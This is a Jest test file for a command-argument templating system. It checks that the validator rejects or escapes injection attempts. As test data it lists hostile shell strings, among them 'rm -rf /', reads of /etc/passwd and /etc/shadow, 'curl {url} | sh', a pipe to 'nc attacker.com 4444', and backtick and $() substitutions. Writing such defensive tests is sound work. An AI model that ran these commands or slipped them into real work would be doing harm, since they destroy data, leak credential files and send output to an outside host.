/**
 * Security tests for Argument Templating System
 * Tests injection prevention, input sanitization, and security validation
 */

import { describe, it, expect, beforeEach, jest } from '@jest/globals';
import { 
  ArgumentTemplater, 
  TemplateValidator
} from '../../src/workflow/argument-templater';
import { Logger } from '../../src/utils/logger';

describe('Argument Templater Security Tests', () => {
  let templater: ArgumentTemplater;
  let validator: TemplateValidator;
  let mockLogger: Logger;

  beforeEach(() => {
    mockLogger = {
      info: jest.fn(),
      error: jest.fn(),
      debug: jest.fn(),
      warn: jest.fn()
    } as any;

    templater = new ArgumentTemplater(mockLogger);
    validator = new TemplateValidator();
    
    jest.clearAllMocks();
  });

  describe('Command Injection Prevention', () => {
    it('should reject templates with command chaining', async () => {
      const dangerousTemplates = [
        'git checkout {branch}; rm -rf /',
        'git checkout {branch} && rm -rf /',
        'git checkout {branch} || rm -rf /',
        'git checkout {branch} | rm -rf /',
        'echo {input} && cat /etc/passwd',
        'curl {url} | sh'
      ];

      for (const template of dangerousTemplates) {
        const result = await templater.processCommandArgs(template, [], {});
        expect(result.executionReady).toBe(false);
        expect(result.validationErrors.some(e => 
          e.includes('injection') || e.includes('dangerous')
        )).toBe(true);
      }
    });

    it('should reject CLI parameters with injection patterns', async () => {
      const dangerousParams = [
        { input: 'value; rm -rf /' },
        { input: 'value && cat /etc/passwd' },
        { input: 'value || echo hacked' },
        { input: 'value | nc attacker.com 4444' },
        { input: 'value `whoami`' },
        { input: 'value $(whoami)' },
        { input: '/etc/passwd' }
      ];

      for (const params of dangerousParams) {
        const result = await templater.processCommandArgs('echo {input}', [], params);
        expect(result.executionReady).toBe(false);
        expect(result.validationErrors.some(e => 
          e.includes('Invalid CLI parameter value')
        )).toBe(true);
      }
    });

    it('should reject arguments with shell metacharacters', async () => {
      const dangerousArgs = [
        ['--message=value;rm -rf /'],
        ['--config=$(cat /etc/passwd)'],
        ['--file=`whoami`'],
        ['--path=/etc/shadow']
      ];

      for (const args of dangerousArgs) {
        const result = await templater.processCommandArgs('echo', args, {});
        expect(result.executionReady).toBe(false);
        expect(result.validationErrors.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Development Pattern Support', () => {
    it('should allow directory traversal patterns for development', () => {
      const developmentPaths = [
        '../../../config/build.yaml',
        '../shared-lib/src',
        '../../node_modules/.bin',
        'workspace/my-project',
        './build/output',
        'relative/path/to/file',
        '/workspace/build',
        'C:\\Users\\Project\\build'
      ];

      for (const path of developmentPaths) {
        expect(validator.checkForInjectionPatterns(path)).toBe(false);
        expect(validator.validateVariableValue(path)).toBe(true);
      }
    });

    it('should still block system file access attempts', () => {
      const dangerousPaths = [
        '/etc/passwd',
        '/etc/shadow',
        '/var/log/system.log'
      ];

      for (const path of dangerousPaths) {
        expect(validator.checkForInjectionPatterns(path)).toBe(true);
        expect(validator.validateVariableValue(path)).toBe(false);
      }
    });
  });

  describe('Input Sanitization', () => {
    it('should sanitize dangerous characters in input', () => {
      const dangerousInputs = [
        'value && rm -rf /',
        'value; cat /etc/passwd',
        'value `whoami`',
        'value $(id)',
        'value | nc attacker.com 4444'
      ];

      const expectedSanitized = [
        'value \\&\\& rm -rf /',
        'value\\; cat /etc/passwd',
        'value \\`whoami\\`',
        'value \\$\\(id\\)',
        'value \\| nc attacker.com 4444'
      ];

      dangerousInputs.forEach((input, index) => {
        const sanitized = validator.sanitizeInput(input);
        expect(sanitized).toBe(expectedSanitized[index]);
      });
    });

    it('should remove control characters', () => {
      const inputWithControlChars = 'text\x00with\x01control\x02chars\x1f';
      const sanitized = validator.sanitizeInput(inputWithControlChars);
      expect(sanitized).toBe('textwithcontrolchars');
    });

    it('should preserve safe characters during sanitization', () => {
      const safeInput = 'workspace-1.2.3_feature/test';
      const sanitized = validator.sanitizeInput(safeInput);
      expect(sanitized).toBe(safeInput);
    });
  });

  describe('Variable Name Security', () => {
    it('should validate variable names against whitelist', () => {
      const validNames = [
        'branch',
        'workspace_name',
        '_private',
        'name123',
        'test_variable_123'
      ];

      const invalidNames = [
        'branch-name',
        '123invalid',
        'name with spaces',
        'name.with.dots',
        'name/with/slashes',
        'name@with.symbols',
        '',
        'a'.repeat(51) // Too long
      ];

      validNames.forEach(name => {
        expect(validator.validateVariableName(name)).toBe(true);
      });

      invalidNames.forEach(name => {
        expect(validator.validateVariableName(name)).toBe(false);
      });
    });

    it('should reject variable names with shell metacharacters', () => {
      const dangerousNames = [
        'name;rm',
        'name&&cat',
        'name||echo',
        'name|whoami',
        'name`id`',
        'name$(whoami)'
      ];

      dangerousNames.forEach(name => {
        expect(validator.validateVariableName(name)).toBe(false);
      });
    });
  });

  describe('Template Length Limits', () => {
    it('should reject templates exceeding maximum length', () => {
      const longTemplate = 'a'.repeat(1001);
      const result = validator.validateTemplateSyntax(longTemplate);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Template exceeds maximum length of 1000 characters');
    });

    it('should accept templates within length limits', () => {
      const acceptableTemplate = 'a'.repeat(1000);
      const result = validator.validateTemplateSyntax(acceptableTemplate);
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject variable values exceeding maximum length', () => {
      const longValue = 'a'.repeat(256);
      expect(validator.validateVariableValue(longValue)).toBe(false);
    });

    it('should accept variable values within length limits', () => {
      const acceptableValue = 'a'.repeat(255);
      expect(validator.validateVariableValue(acceptableValue)).toBe(true);
    });
  });

  describe('Buffer Overflow Protection', () => {
    it('should handle extremely long inputs gracefully', async () => {
      const extremelyLong = 'a'.repeat(10000);
      const result = await templater.processCommandArgs('echo {input}', [], { input: extremelyLong });
      
      expect(result.executionReady).toBe(false);
      expect(result.validationErrors.some(e => 
        e.includes('Invalid CLI parameter value')
      )).toBe(true);
    });

    it('should prevent nested template expansion attacks', async () => {
      // Create a scenario where variable values contain templates
      const maliciousParams = {
        branch: '{workspace}',
        workspace: '{branch}'
      };

      const result = await templater.processCommandArgs(
        'echo {branch}-{workspace}',
        [],
        maliciousParams
      );

      // Should substitute the provided values (even if they look like templates)
      expect(result.command).toBe('echo {branch}-{workspace}');
      expect(result.substitutions).toEqual({
        branch: '{workspace}',
        workspace: '{branch}'
      });
    });
  });

  describe('Race Condition Prevention', () => {
    it('should handle concurrent template processing safely', async () => {
      const promises: Promise<any>[] = [];
      
      // Create multiple concurrent processing requests
      for (let i = 0; i < 10; i++) {
        const promise = templater.processCommandArgs(
          'echo "Processing {branch} {i}"',
          [],
          { branch: `feature-${i}`, i: i.toString() }
        );
        promises.push(promise);
      }

      const results = await Promise.all(promises);

      // All should complete successfully
      results.forEach((result, index) => {
        expect(result.executionReady).toBe(true);
        expect(result.command).toBe('echo "Processing feature-' + index + ' ' + index + '"');
      });
    });
  });

  describe('Information Disclosure Prevention', () => {
    it('should not expose sensitive system information in error messages', async () => {
      const result = await templater.processCommandArgs(
        'git checkout {branch}; cat /etc/passwd',
        [],
        { branch: 'main' }
      );

      expect(result.executionReady).toBe(false);
      expect(result.validationErrors.some(e => 
        e.includes('injection') || e.includes('dangerous')
      )).toBe(true);
      
      // Should not reveal file paths or system details
      result.validationErrors.forEach(error => {
        expect(error).not.toContain('/etc/passwd');
        expect(error).not.toContain(process.cwd());
      });
    });

    it('should sanitize debug output', async () => {
      const sensitiveParams = { 
        password: 'secret123',
        token: 'abc123def456'
      };

      await templater.processCommandArgs('echo {message}', [], sensitiveParams);

      // Debug logs should not contain sensitive information
      expect(mockLogger.debug).not.toHaveBeenCalledWith(
        expect.stringContaining('secret123')
      );
      expect(mockLogger.debug).not.toHaveBeenCalledWith(
        expect.stringContaining('abc123def456')
      );
    });
  });

  describe('Resource Exhaustion Prevention', () => {
    it('should limit template processing time', async () => {
      const startTime = Date.now();
      
      // Create a complex template with many placeholders
      let complexTemplate = 'echo';
      for (let i = 0; i < 100; i++) {
        complexTemplate += ` {var${i}}`;
      }
      
      const variables: Record<string, string> = {};
      for (let i = 0; i < 100; i++) {
        variables[`var${i}`] = `value${i}`;
      }

      await templater.processCommandArgs(complexTemplate, [], variables);
      
      const processingTime = Date.now() - startTime;
      expect(processingTime).toBeLessThan(1000); // Should complete within 1 second
    });

    it('should handle memory efficiently with large variable sets', async () => {
      // Create a large number of variables
      const variables: Record<string, string> = {};
      for (let i = 0; i < 1000; i++) {
        variables[`var${i}`] = `value${i}`;
      }

      const result = await templater.processCommandArgs(
        'echo {var0} {var999}',
        [],
        variables
      );

      expect(result.executionReady).toBe(true);
      expect(result.command).toBe('echo value0 value999');
    });
  });
});